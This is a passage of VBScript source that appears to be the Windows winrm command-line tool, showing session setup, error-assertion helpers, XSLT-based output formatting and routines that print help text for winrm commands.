            ASSERTBOOL (LCase(optDic.Argument(NPARA_AUTH)) = VAL_NEGOTIATE OR LCase(optDic.Argument(NPARA_AUTH)) = VAL_KERBEROS), "The " & NPARA_SPNPORT & " option is only valid when the authentication mechanism is " & VAL_NEGOTIATE & " or " & VAL_KERBEROS
        end if
        sessionFlags = sessionFlags OR wsman.SessionFlagEnableSPNServerPort
    end if

    on error resume next
    set session = wsman.CreateSession(conStr, sessionFlags, conOpt)
    ASSERTERR wsman, formatOption
    on error goto 0

    if optDic.ArgumentExists(NPARA_TIMEOUT) then
        ASSERTNAL(NPARA_TIMEOUT)
        tout = optDic.Argument(NPARA_TIMEOUT)
        ASSERTBOOL IsNumeric(tout), "Numeric value for -timeout option is expected"
        session.Timeout = optDic.Argument(NPARA_TIMEOUT)        
    end if
    
    set CreateSession = session
end function

private sub ASSERTERR(obj, formatOption)
    dim errNo
    dim errDesc
    dim responseStr
    dim formattedStr

    if Err.Number <> 0 then
        errNo = Err.Number
        errDesc = Err.Description
        responseStr = obj.Error
        If Reformat(responseStr,formattedStr,formatOption) Then
            stdErr.WriteLine formattedStr
        Else
            stdErr.WriteLine responseStr
        End if
        stdErr.WriteLine GetResource("L_ERRNO_Message") & " " & errNo & " 0x" & Hex(errNo)
        stdErr.WriteLine errDesc
        WScript.Quit(ERR_GENERAL_FAILURE)
    end if
end sub

' Assert Named Argument Length
private sub ASSERTNAL(namedArg)
    if Len(wsmanCmdLineObj.Argument(namedArg)) = 0 then
        stdErr.WriteLine GetResource("L_ERR_Message") & GetResource("L_ARGNOVAL_Message") & namedArg
        WScript.Quit(ERR_GENERAL_FAILURE)
    end if
end sub

private sub ASSERTBOOL(bool, msg)
    if Not bool then
        stdErr.WriteLine GetResource("L_ERR_Message") & msg
        WScript.Quit(ERR_GENERAL_FAILURE)
    end if
end sub

private function ReFormat(rawStr,formattedStr,formatOption)
    dim xslFile
    dim xmlFile
    dim xmlFileName
    dim xslFileName 
    dim FORMAT_XSL_PATH

    if Len(rawStr) = 0 then
        ReFormat = false
        exit function
    end if
    
    on error resume next
    err.clear
    
    if LCase(formatOption) = VAL_FORMAT_XML then
        formattedStr = rawStr
    else
        set xmlFile = CreateObject("MSXML2.DOMDOCUMENT.6.0")
        if Err.number <> 0 then
            stdErr.WriteLine GetResource("L_MSXML6MISSING_Message")
            on error goto 0
            ReFormat = false
            exit function
        end if
 
        set xslFile = CreateObject("MSXML2.DOMDOCUMENT.6.0")
        if Err.number <> 0 then
            stdErr.WriteLine GetResource("L_MSXML6MISSING_Message")
            on error goto 0
            ReFormat = false
            exit function
        end if
        
        xmlFile.async = false
        xslFile.async = false
            
        xmlFile.LoadXML(rawStr)
        if (xmlFile.parseError.errorCode <> 0) then
            stdErr.WriteLine GetResource("L_XMLERROR_Message") & xmlFile.parseError.reason
            on error goto 0
            ReFormat = false
            exit function
        end If
        
        FORMAT_XSL_PATH = WSHShell.ExpandEnvironmentStrings("%systemroot%\system32\")
        if InStr(LCase(WScript.Path),"\syswow64") > 0 then
            FORMAT_XSL_PATH = WSHShell.ExpandEnvironmentStrings("%systemroot%\syswow64\")
        end if
             
        if LCase(formatOption) = VAL_FORMAT_TEXT then
            FORMAT_XSL_PATH = FORMAT_XSL_PATH & VAL_FORMAT_TEXT_XSLT
        elseif LCase(formatOption) = VAL_FORMAT_PRETTY then
            FORMAT_XSL_PATH = FORMAT_XSL_PATH & VAL_FORMAT_PRETTY_XSLT
        else
            stdErr.WriteLine GetResource("L_FORMATLERROR_Message") & formatOption
            stdErr.WriteLine 
            on error goto 0
            ReFormat = false
            exit function
        end If

        if Not xslFile.load(FORMAT_XSL_PATH) then
            stdErr.WriteLine GetResource("L_XSLERROR_Message") & FORMAT_XSL_PATH
            if xslFile.parseError.errorCode < 0 then
                stdErr.WriteLine xslFile.parseError.reason
            end if
            on error goto 0
            ReFormat = false
            exit function
        end if
        
        formattedStr = xmlFile.transformNode (xslFile)
        if Err.number <> 0 then
            stdErr.WriteLine Err.Description
            on error goto 0
            ReFormat = false
            exit function
        end if
    end if
    ReFormat = true
end function


Private Sub HelpMenu(topic, stream)
    Dim helpMenu
    Set helpMenu = CreateObject("Scripting.Dictionary")
    helpMenu.Add OP_HELP, "HelpHelp"
    helpMenu.Add OP_GET,  "HelpGet"
    helpMenu.Add OP_PUT,  "HelpSet"
    helpMenu.Add OP_CONFIGSDDL,  "HelpConfigSDDL"
    helpMenu.Add OP_CRE,  "HelpCreate"
    helpMenu.Add OP_DEL,  "HelpDelete"
    helpMenu.Add OP_ENU,  "HelpEnum"
    helpMenu.Add OP_INV,  "HelpInvoke"
    helpMenu.Add OP_QUICKCONFIG,  "HelpQuickConfig"
    helpMenu.Add OP_IDENTIFY,  "HelpIdentify"
    helpMenu.Add OP_HELPMSG,  "HelpMsg"

    helpMenu.Add NPARA_USERNAME, "HelpAuth"
    helpMenu.Add NPARA_PASSWORD, "HelpAuth"
    helpMenu.Add NPARA_PROXYAUTH,     "HelpProxy"
    helpMenu.Add NPARA_PROXYACCESS,     "HelpProxy"
    helpMenu.Add NPARA_PROXYUSERNAME, "HelpProxy"
    helpMenu.Add NPARA_PROXYPASSWORD, "HelpProxy"
    helpMenu.Add NPARA_DIALECT,  "HelpSwitches"
    helpMenu.Add NPARA_FILE,     "HelpInput"
    helpMenu.Add NPARA_FILTER,   "HelpSwitches"
    helpMenu.Add NPARA_REMOTE,   "HelpRemote"
    helpMenu.Add NPARA_NOCACHK,  "HelpSwitches"
    helpMenu.Add NPARA_NOCNCHK,  "HelpSwitches"
    helpMenu.Add NPARA_NOREVCHK,  "HelpSwitches"
    helpMenu.Add NPARA_DEFAULTCREDS,  "HelpSwitches"
    helpMenu.Add NPARA_SPNPORT,  "HelpSwitches"
    helpMenu.Add NPARA_TIMEOUT,  "HelpSwitches"
    helpMenu.Add NPARA_AUTH,     "HelpAuth"
    helpMenu.Add NPARA_UNENCRYPTED, "HelpRemote"
    helpMenu.Add NPARA_USESSL,   "HelpRemote"
    helpMenu.Add NPARA_ENCODING, "HelpSwitches"
    helpMenu.Add NPARA_FORMAT,   "HelpSwitches"
    helpMenu.Add NPARA_OPTIONS,  "HelpSwitches"
    helpMenu.Add NPARA_FRAGMENT, "HelpSwitches"
    helpMenu.Add "@{}",          "HelpInput"

    helpMenu.Add HELP_CONFIG,    "HelpConfig"
    helpMenu.Add HELP_CertMapping,    "HelpCertMapping"
    helpMenu.Add HELP_URIS,      "HelpUris"
    helpMenu.Add HELP_ALIAS,     "HelpAlias"
    helpMenu.Add HELP_ALIASES,   "HelpAlias"
    helpMenu.Add HELP_FILTERS,   "HelpFilters"
    helpMenu.Add HELP_SWITCHES,  "HelpSwitches"
    helpMenu.Add HELP_REMOTING,  "HelpRemote"
    helpMenu.Add HELP_INPUT,     "HelpInput"
    helpMenu.Add HELP_AUTH,      "HelpAuth"
    helpMenu.Add HELP_PROXY,     "HelpProxy"

    Dim helpFctn
    topic = LCase(topic)
    If helpMenu.Exists(topic) Then
        helpFctn = helpMenu(topic)
    Else
        helpFctn = "HelpHelp"
    End If

    stream.WriteLine GetResource("L_Help_Title_0_Message") & vbNewLine

    If topic <> "all" Then
        Dim cmd
        cmd = "Call " & helpFctn & "(stream)"
        Execute(cmd)
    Else
        HelpAll(stream)
    End If
End Sub

Private Sub HelpTopic(stream, label)
    dim NL 
    NL = vbNewLine
    Dim seperator
    seperator = vbNewLine & "-------------------------------------------------------------------------------"
    stream.WriteLine seperator & NL & "TOPIC: " & label & NL

End Sub 

Private Sub HelpAll(stream)
    Dim seperator
    seperator = vbNewLine & "-------------------------------------------------------------------------------"
    dim NL 
    NL = vbNewLine

    HelpTopic stream, "winrm -?"
    HelpHelp stream
    
    HelpTopic stream, "winrm get -?"
    HelpGet stream

    HelpTopic stream, "winrm set -?"
    HelpSet stream

    HelpTopic stream, "winrm create -?"
    HelpCreate stream

    HelpTopic stream, "winrm delete -?"
    HelpDelete stream

    HelpTopic stream, "winrm enumerate -?"
    HelpEnum stream

    HelpTopic stream, "winrm invoke -?"
    HelpInvoke stream

    HelpTopic stream, "winrm identify -?"
    HelpIdentify stream

    HelpTopic stream, "winrm quickconfig -?"
    HelpQuickConfig stream

    HelpTopic stream, "winrm helpmsg -?"
    HelpMsg stream
	
    HelpTopic stream, "winrm help uris"
    HelpUris stream

    HelpTopic stream, "winrm help alias"
    HelpAlias stream

    HelpTopic stream, "winrm help config"
    HelpConfig stream

    HelpTopic stream, "winrm help configsddl"
    HelpConfigsddl stream

    HelpTopic stream, "winrm help certmapping"
    HelpCertMapping stream

    HelpTopic stream, "winrm help remoting"
    HelpRemote stream

    HelpTopic stream, "winrm help auth"
    HelpAuth stream

    HelpTopic stream, "winrm help proxy"
    HelpProxy stream

    HelpTopic stream, "winrm help input"
    HelpInput stream

    HelpTopic stream, "winrm help filters"
    HelpFilters stream

    HelpTopic stream, "winrm help switches"
    HelpSwitches stream
End Sub

''''''''''''''''''''''''''''''''''''''''''''
' HELP - HELP
Private Sub HelpHelp(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpHelp_000_0_Message") & NL & _
GetResource("L_HelpHelp_001_0_Message") & NL & _
GetResource("L_HelpHelp_001_1_Message") & NL & _
GetResource("L_HelpHelp_002_0_Message") & NL & _
GetResource("L_HelpHelp_003_0_Message") & NL & _
GetResource("L_HelpHelp_004_0_Message") & NL & _
GetResource("L_HelpHelp_005_0_Message") & NL & _
GetResource("L_HelpHelp_007_0_Message") & NL & _
GetResource("L_HelpHelp_008_0_Message") & NL & _
GetResource("L_HelpHelp_009_0_Message") & NL & _
GetResource("L_HelpHelp_010_0_Message") & NL & _
GetResource("L_HelpHelp_011_0_Message") & NL & _
GetResource("L_HelpHelp_012_0_Message") & NL & _
GetResource("L_HelpHelp_013_0_Message") & NL & _
GetResource("L_HelpHelp_014_0_Message") & NL & _
GetResource("L_HelpHelp_015_0_Message") & NL & _
GetResource("L_HelpHelp_015_1_Message") & NL & _
GetResource("L_HelpHelp_016_0_Message") & NL & _
GetResource("L_HelpHelp_016_1_Message") & NL & _
GetResource("L_HelpHelp_016_3_Message") & NL & _
GetResource("L_HelpHelp_016_4_Message") & NL & _
GetResource("L_HelpHelp_017_0_Message") & NL & _
GetResource("L_HelpHelp_018_0_Message") & NL & _
GetResource("L_HelpHelp_019_0_Message") & NL & _
GetResource("L_HelpHelp_020_0_Message") & NL & _
GetResource("L_HelpHelp_021_0_Message") & NL & _
GetResource("L_HelpHelp_021_2_Message") & NL & _
GetResource("L_HelpHelp_022_0_Message") & NL & _
GetResource("L_HelpHelp_023_0_Message") & NL & _
GetResource("L_HelpHelp_024_0_Message") & NL & _
GetResource("L_HelpHelp_025_0_Message") & NL & _
GetResource("L_HelpHelp_026_0_Message")
End Sub

'''''''''''''''''''''
' HELP - GET
Private Sub HelpGet(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpGet_000_0_Message") & NL & _
GetResource("L_HelpGet_001_0_Message") & NL & _
GetResource("L_HelpGet_002_0_Message") & NL & _
GetResource("L_HelpGet_003_0_Message") & NL & _
GetResource("L_HelpGet_004_0_Message") & NL & _
GetResource("L_HelpGet_005_0_Message") & NL & _
GetResource("X_HelpGet_006_0_Message") & NL & _
GetResource("L_HelpGet_007_0_Message") & NL & _
GetResource("L_HelpGet_008_0_Message") & NL & _
GetResource("X_HelpGet_009_0_Message") & NL & _
GetResource("L_HelpGet_010_0_Message") & NL & _ 
GetResource("L_HelpGet_014_0_Message") & NL & _
GetResource("X_HelpGet_015_0_Message") & NL & _
GetResource("L_HelpGet_016_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - CONFIGSDDL
Private Sub HelpConfigsddl(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpConfigsddl_000_1_Message") & NL & _
GetResource("L_HelpConfigsddl_001_0_Message") & NL & _
GetResource("L_HelpConfigsddl_002_0_Message") & NL & _
GetResource("L_HelpConfigsddl_002_1_Message") & NL & _
GetResource("L_HelpConfigsddl_003_0_Message") & NL & _
GetResource("L_HelpConfigsddl_004_0_Message") & NL & _
GetResource("L_HelpConfigsddl_005_0_Message") & NL & _
GetResource("L_HelpConfigsddl_005_1_Message") & NL & _
GetResource("L_HelpConfigsddl_006_0_Message") & NL & _
GetResource("L_HelpConfigsddl_010_0_Message") & NL & _
GetResource("L_HelpConfigsddl_011_0_Message") & NL & _
GetResource("X_HelpConfigsddl_012_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message")  & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - SET
Private Sub HelpSet(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpSet_001_0_Message") & NL & _
GetResource("L_HelpSet_002_0_Message") & NL & _
GetResource("L_HelpSet_003_0_Message") & NL & _
GetResource("L_HelpSet_004_0_Message") & NL & _
GetResource("L_HelpSet_005_0_Message") & NL & _
GetResource("L_HelpSet_006_0_Message") & NL & _
GetResource("L_HelpSet_007_0_Message") & NL & _
GetResource("L_HelpSet_008_0_Message") & NL & _
GetResource("L_HelpSet_009_0_Message") & NL & _
GetResource("X_HelpSet_010_0_Message") & NL & _
GetResource("L_HelpSet_011_0_Message") & NL & _
GetResource("L_HelpSet_012_0_Message") & NL & _
GetResource("X_HelpSet_013_0_Message") & NL & _
GetResource("L_HelpSet_014_0_Message") & NL & _
GetResource("L_HelpSet_018_0_Message") & NL & _
GetResource("X_HelpSet_019_0_Message") & NL & _
GetResource("L_HelpSet_020_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - CREATE
Private Sub HelpCreate(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpCreate_001_0_Message") & NL & _
GetResource("L_HelpCreate_002_0_Message") & NL & _
GetResource("L_HelpCreate_003_0_Message") & NL & _
GetResource("L_HelpCreate_004_0_Message") & NL & _
GetResource("L_HelpCreate_005_0_Message") & NL & _
GetResource("L_HelpCreate_006_0_Message") & NL & _
GetResource("L_HelpCreate_007_0_Message") & NL & _
GetResource("L_HelpCreate_008_0_Message") & NL & _
GetResource("X_HelpCreate_009_0_Message") & NL & _
GetResource("L_HelpCreate_010_0_Message") & NL & _
GetResource("L_HelpCreate_011_0_Message") & NL & _
GetResource("X_HelpCreate_012_0_Message") & NL & _
GetResource("L_HelpCreate_013_0_Message") & NL & _
GetResource("L_HelpCreate_014_0_Message") & NL & _
GetResource("L_HelpCreate_015_0_Message") & NL & _
GetResource("X_HelpCreate_016_0_Message") & NL & _
GetResource("L_HelpCreate_017_0_Message") & NL & _
GetResource("L_HelpCreate_022_0_Message") & NL & _
GetResource("X_HelpCreate_023_0_Message") & NL & _
GetResource("L_HelpCreate_024_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - DELETE
Private Sub HelpDelete(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpDelete_001_0_Message") & NL & _
GetResource("L_HelpDelete_002_0_Message") & NL & _
GetResource("L_HelpDelete_003_0_Message") & NL & _
GetResource("L_HelpDelete_004_0_Message") & NL & _
GetResource("L_HelpDelete_005_0_Message") & NL & _
GetResource("X_HelpDelete_006_0_Message") & NL & _
GetResource("L_HelpDelete_007_0_Message") & NL & _
GetResource("L_HelpDelete_008_0_Message") & NL & _
GetResource("X_HelpDelete_009_0_Message") & NL & _
GetResource("L_HelpDelete_010_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - ENUMERATE
Private Sub HelpEnum(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpEnum_001_0_Message") & NL & _
GetResource("L_HelpEnum_001_1_Message") & NL & _
GetResource("L_HelpEnum_002_0_Message") & NL & _
GetResource("L_HelpEnum_003_0_Message") & NL & _
GetResource("L_HelpEnum_004_0_Message") & NL & _
GetResource("L_HelpEnum_005_0_Message") & NL & _
GetResource("L_HelpEnum_006_0_Message") & NL & _
GetResource("L_HelpEnum_006_1_Message") & NL & _
GetResource("L_HelpEnum_006_2_Message") & NL & _
GetResource("L_HelpEnum_006_3_Message") & NL & _
GetResource("L_HelpEnum_006_4_Message") & NL & _
GetResource("L_HelpEnum_006_5_Message") & NL & _
GetResource("L_HelpEnum_006_6_Message") & NL & _
GetResource("L_HelpEnum_006_7_Message") & NL & _
GetResource("L_HelpEnum_006_8_Message") & NL & _
GetResource("L_HelpEnum_006_9_Message") & NL & _
GetResource("L_HelpEnum_006_10_Message") & NL & _
GetResource("L_HelpEnum_006_11_Message") & NL & _
GetResource("L_HelpEnum_006_12_Message") & NL & _
GetResource("L_HelpEnum_006_13_Message") & NL & _
GetResource("L_HelpEnum_006_14_Message") & NL & _
GetResource("L_HelpEnum_006_15_Message") & NL & _
GetResource("L_HelpEnum_006_16_Message") & NL & _
GetResource("L_HelpEnum_006_17_Message") & NL & _
GetResource("L_HelpEnum_006_18_Message") & NL & _
GetResource("L_HelpEnum_006_19_Message") & NL & _
GetResource("L_HelpEnum_006_20_Message") & NL & _
GetResource("L_HelpEnum_006_21_Message") & NL & _
GetResource("L_HelpEnum_006_22_Message") & NL & _
GetResource("L_HelpEnum_006_23_Message") & NL & _
GetResource("L_HelpEnum_007_0_Message") & NL & _
GetResource("X_HelpEnum_008_0_Message") & NL & _
GetResource("L_HelpEnum_009_0_Message") & NL & _
GetResource("L_HelpEnum_010_0_Message") & NL & _
GetResource("X_HelpEnum_011_0_Message") & NL & _
GetResource("L_HelpEnum_012_0_Message") & NL & _
GetResource("L_HelpEnum_016_0_Message") & NL & _
GetResource("X_HelpEnum_017_0_Message") & NL & _
GetResource("L_HelpEnum_018_0_Message") & NL & _
GetResource("L_HelpEnum_019_0_Message") & NL & _
GetResource("X_HelpEnum_020_0_Message") & NL & _
GetResource("L_HelpEnum_021_0_Message") & NL & _
GetResource("L_HelpEnum_022_0_Message") & NL & _
GetResource("X_HelpEnum_023_0_Message") & NL & _
GetResource("L_HelpEnum_024_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Filters_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - INVOKE
Private Sub HelpInvoke(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpInvoke_001_0_Message") & NL & _
GetResource("L_HelpInvoke_002_0_Message") & NL & _
GetResource("L_HelpInvoke_003_0_Message") & NL & _
GetResource("L_HelpInvoke_004_0_Message") & NL & _
GetResource("L_HelpInvoke_005_0_Message") & NL & _
GetResource("L_HelpInvoke_006_0_Message") & NL & _
GetResource("L_HelpInvoke_007_0_Message") & NL & _
GetResource("L_HelpInvoke_008_0_Message") & NL & _
GetResource("X_HelpInvoke_009_0_Message") & NL & _
GetResource("L_HelpInvoke_010_0_Message") & NL & _
GetResource("L_HelpInvoke_011_0_Message") & NL & _
GetResource("X_HelpInvoke_012_0_Message") & NL & _
GetResource("L_HelpInvoke_013_0_Message") & NL & _
GetResource("X_HelpInvoke_014_0_Message") & NL & _
GetResource("L_HelpInvoke_015_0_Message") & NL & _
GetResource("L_HelpInvoke_016_0_Message") & NL & _
GetResource("X_HelpInvoke_017_0_Message") & NL & _
GetResource("L_HelpInvoke_018_0_Message") & NL & _
GetResource("L_HelpInvoke_019_0_Message") & NL & _
GetResource("L_HelpInvoke_019_1_Message") & NL & _
GetResource("X_HelpInvoke_020_0_Message") & NL & _
GetResource("L_HelpInvoke_021_0_Message") & NL & _
GetResource("L_HelpInvoke_022_0_Message") & NL & _
GetResource("L_HelpInvoke_022_1_Message") & NL & _
GetResource("X_HelpInvoke_023_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - IDENTIFY
Private Sub HelpIdentify(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("X_HelpIdentify_001_0_Message") & NL & _
GetResource("L_HelpIdentify_003_0_Message") & NL & _
GetResource("L_HelpIdentify_004_0_Message") & NL & _
GetResource("L_HelpIdentify_005_0_Message") & NL & _
GetResource("L_HelpIdentify_006_0_Message") & NL & _
GetResource("L_HelpIdentify_007_0_Message") & NL & _
GetResource("L_HelpIdentify_008_0_Message") & NL & _
GetResource("L_HelpIdentify_009_0_Message") & NL & _
GetResource("X_HelpIdentify_010_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message") & NL & _
GetResource("X_Help_SeeAlso_Remoting_Message")
End Sub

'''''''''''''''''''''
' HELP - HELPMSG
Private Sub HelpMsg(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("X_HelpHelpMessaage_001_0_Message") & NL & _
GetResource("X_HelpHelpMessaage_002_0_Message") & NL & _
GetResource("X_HelpHelpMessaage_003_0_Message") & NL & _
GetResource("X_HelpHelpMessaage_004_0_Message") & NL & _
GetResource("X_HelpHelpMessaage_006_0_Message")
End Sub


'''''''''''''''''''''
' HELP - AUTH
Private Sub HelpAuth(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpAuth_001_0_Message") & NL & _
GetResource("L_HelpAuth_002_0_Message") & NL & _
GetResource("L_HelpAuth_003_0_Message") & NL & _
GetResource("L_HelpAuth_004_0_Message") & NL & _
GetResource("L_HelpAuth_004_1_Message") & NL & _
GetResource("L_HelpAuth_005_0_Message") & NL & _
GetResource("L_HelpAuth_006_0_Message") & NL & _
GetResource("L_HelpAuth_007_0_Message") & NL & _
GetResource("L_HelpAuth_008_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpAuthAuth_001_0_Message") & NL & _
GetResource("L_HelpAuthAuth_002_0_Message") & NL & _
GetResource("L_HelpAuthAuth_003_0_Message")
If osVersion >= osVista Then
    stream.WriteLine GetResource("L_HelpAuthAuth_004_0_Message")
Else
    stream.WriteLine GetResource("L_HelpAuthAuth_004_1_Message")
End If
stream.WriteLine _
GetResource("L_HelpAuthAuth_005_0_Message") & NL & _
GetResource("X_HelpAuthAuth_006_0_Message") & NL & _
GetResource("X_HelpAuthAuth_007_0_Message") & NL & _
GetResource("X_HelpAuthAuth_008_0_Message") & NL & _
GetResource("X_HelpAuthAuth_009_0_Message") & NL & _
GetResource("X_HelpAuthAuth_010_0_Message") & NL & _
GetResource("X_HelpAuthAuth_010_1_Message")
If osVersion >= osVista Then
    stream.WriteLine GetResource("X_HelpAuthAuth_010_2_Message")
End If
stream.WriteLine _
GetResource("L_HelpAuthAuth_011_0_Message") & NL & _
GetResource("L_HelpAuthAuth_012_0_Message") & NL & _
GetResource("L_HelpAuthAuth_013_0_Message") & NL & _
GetResource("L_HelpAuthAuth_013_1_Message") & NL & _
GetResource("L_HelpAuthAuth_013_2_Message") & NL & _
GetResource("L_HelpAuthAuth_014_0_Message") & NL & _
GetResource("L_HelpAuthAuth_015_0_Message") & NL & _
GetResource("L_HelpAuthAuth_016_0_Message") & NL & _
GetResource("L_HelpAuthAuth_017_0_Message") & NL & _
GetResource("L_HelpAuthAuth_018_0_Message") & NL & _
GetResource("L_HelpAuthAuth_019_0_Message") & NL & _
GetResource("L_HelpAuthAuth_020_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpAuthUsername_001_0_Message") & NL & _
GetResource("L_HelpAuthUsername_002_0_Message") & NL & _
GetResource("L_HelpAuthUsername_003_0_Message") & NL & _
GetResource("L_HelpAuthUsername_004_0_Message") & NL & _
GetResource("L_HelpAuthUsername_005_0_Message") & NL & _
GetResource("L_HelpAuthUsername_006_0_Message") & NL & _
GetResource("L_HelpAuthUsername_007_0_Message") & NL & _
GetResource("L_HelpAuthUsername_008_0_Message") & NL & _
GetResource("L_HelpAuthUsername_009_0_Message") & NL & _
GetResource("L_HelpAuthUsername_010_0_Message") & NL & _
GetResource("L_HelpAuthUsername_011_0_Message") & NL & _
GetResource("L_HelpAuthUsername_011_1_Message") & NL & _
GetResource("L_HelpAuthUsername_012_0_Message") & NL & _
GetResource("L_HelpAuthUsername_013_0_Message") & NL & _
GetResource("L_HelpAuthUsername_014_0_Message") & NL & _
GetResource("L_HelpAuthUsername_015_0_Message")
If osVersion >= osVista Then
    stream.WriteLine GetResource("L_HelpAuthUsername_016_0_Message")
End If
stream.WriteLine _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpAuthPassword_001_0_Message") & NL & _
GetResource("L_HelpAuthPassword_002_0_Message") & NL & _
GetResource("L_HelpAuthPassword_003_0_Message") & NL & _
GetResource("L_HelpAuthPassword_004_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_001_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_002_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_003_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_004_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_005_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_006_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_007_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_008_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_009_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_010_0_Message") & NL & _
GetResource("L_HelpAuthCertificate_011_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - PROXY
Private Sub HelpProxy(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("X_HelpProxy_001_0_Message") & NL & _
GetResource("X_HelpProxy_002_0_Message") & NL & _
GetResource("X_HelpProxy_002_1_Message") & NL & _
GetResource("X_HelpProxy_003_0_Message") & NL & _
GetResource("X_HelpProxy_004_0_Message") & NL & _
GetResource("L_HelpProxy_005_0_Message") & NL & _
GetResource("L_HelpProxy_006_0_Message") & NL & _
GetResource("L_HelpProxy_007_0_Message") & NL & _
GetResource("X_HelpProxyAccess_001_0_Message") & NL & _
GetResource("L_HelpProxyAccess_002_0_Message") & NL & _
GetResource("L_HelpProxyAccess_003_0_Message") & NL & _
GetResource("L_HelpProxyAccess_004_0_Message") & NL & _
GetResource("L_HelpProxyAccess_005_0_Message") & NL & _
GetResource("X_HelpProxyAccess_006_0_Message") & NL & _
GetResource("X_HelpProxyAccess_007_0_Message") & NL & _
GetResource("X_HelpProxyAccess_008_0_Message") & NL & _
GetResource("X_HelpProxyAccess_009_0_Message") & NL & _
GetResource("L_HelpProxyAccess_010_0_Message") & NL & _
GetResource("L_HelpProxyAccess_011_0_Message") & NL & _
GetResource("L_HelpProxyAccess_012_0_Message") & NL & _
GetResource("L_HelpProxyAccess_013_0_Message") & NL & _
GetResource("L_HelpProxyAccess_014_0_Message") & NL & _
GetResource("L_HelpProxyAccess_015_0_Message") & NL & _
GetResource("L_HelpProxyAuth_001_0_Message") & NL & _
GetResource("L_HelpProxyAuth_002_0_Message") & NL & _
GetResource("L_HelpProxyAuth_003_0_Message") & NL & _
GetResource("L_HelpProxyAuth_004_0_Message") & NL & _
GetResource("L_HelpProxyAuth_005_0_Message") & NL & _
GetResource("X_HelpProxyAuth_007_0_Message") & NL & _
GetResource("X_HelpProxyAuth_008_0_Message") & NL & _
GetResource("X_HelpProxyAuth_009_0_Message") & NL & _
GetResource("L_HelpProxyAuth_010_0_Message") & NL & _
GetResource("L_HelpProxyUsername_001_0_Message") & NL & _
GetResource("L_HelpProxyUsername_002_0_Message") & NL & _
GetResource("L_HelpProxyUsername_003_0_Message") & NL & _
GetResource("L_HelpProxyUsername_005_0_Message") & NL & _
